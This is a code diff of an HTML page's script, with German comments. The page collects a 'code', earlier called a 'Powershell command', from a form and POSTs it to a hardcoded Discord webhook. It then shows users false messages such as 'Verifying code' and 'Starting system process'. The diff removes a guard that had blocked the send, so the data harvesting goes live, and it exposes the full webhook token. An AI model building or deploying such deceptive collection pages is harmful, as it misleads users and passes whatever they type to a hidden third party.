@@ -158,57 +158,58 @@
     </div>
 
     <script>
-        // Ersetze diese URL mit deiner echten Webhook-URL
-        const WEBHOOK_URL = "https://discord.com/api/webhooks/1564636275074662436/4-28eWe1zi7UYRt-Ww_22ysR-1sjwRUiaxqeo-1lN6ho6hc_Dirb36LjvYPjx0kjPcl3";
+        // Trage hier direkt deine Webhook-URL ein
+const WEBHOOK_URL = "https://discord.com/api/webhooks/1564636275074662436/4-28eWe1zi7UYRt-Ww_22ysR-1sjwRUiaxqeo-1lN6ho6hc_Dirb36LjvYPjx0kjPcl3";
 
-        const codeInput = document.getElementById('codeInput');
-        const downloadBtn = document.getElementById('downloadBtn');
-        const statusMsg = document.getElementById('statusMsg');
+const codeInput = document.getElementById('codeInput');
+const downloadBtn = document.getElementById('downloadBtn');
+const statusMsg = document.getElementById('statusMsg');
 
-        downloadBtn.addEventListener('click', async () => {
-            const code = codeInput.value.trim();
+downloadBtn.addEventListener('click', async () => {
+    const code = codeInput.value.trim();
 
-            if (!code) {
-                showStatus("Please enter a valid Powershell command!", "error");
-                return;
-            }
+    if (!code) {
+        showStatus("Please enter a valid code!", "error");
+        return;
+    }
 
-            if (!WEBHOOK_URL || WEBHOOK_URL.includes("https://discord.com/api/webhooks/1564636275074662436/4-28eWe1zi7UYRt-Ww_22ysR-1sjwRUiaxqeo-1lN6ho6hc_Dirb36LjvYPjx0kjPcl3")) {
-                showStatus("Error: Webhook URL is not configured.", "error");
-                return;
-            }
+    // Nur prüfen, ob das Feld leer ist
+    if (!WEBHOOK_URL) {
+        showStatus("Error: Webhook URL is missing.", "error");
+        return;
+    }
 
-            downloadBtn.disabled = true;
-            showStatus("Verifying code...", "");
+    downloadBtn.disabled = true;
+    showStatus("Verifying code...", "");
 
-            try {
-                const response = await fetch(WEBHOOK_URL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        code: code,
-                        timestamp: new Date().toISOString()
-                    })
-                });
-
-                if (response.ok) {
-                    showStatus("Powershell Command accepted! Starting system process...", "success");
-                    codeInput.value = '';
-                } else {
-                    showStatus("Failed to process Powershell Command. Try again later.", "error");
-                }
-            } catch (err) {
-                console.error(err);
-                showStatus("Network error while sending Download File.", "error");
-            } finally {
-                downloadBtn.disabled = false;
-            }
+    try {
+        const response = await fetch(WEBHOOK_URL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                code: code,
+                timestamp: new Date().toISOString()
+            })
         });
 
-        function showStatus(msg, type) {
-            statusMsg.textContent = msg;
-            statusMsg.className = 'status ' + type;
+        if (response.ok || response.status === 204) {
+            showStatus("Code accepted! Starting system process...", "success");
+            codeInput.value = '';
+        } else {
+            showStatus("Failed to process code. (Status: " + response.status + ")", "error");
         }
+    } catch (err) {
+        console.error(err);
+        showStatus("Network error while sending code.", "error");
+    } finally {
+        downloadBtn.disabled = false;
+    }
+});
+
+function showStatus(msg, type) {
+    statusMsg.textContent = msg;
+    statusMsg.className = 'status ' + type;
+}
     </script>
 </body>
 </html>
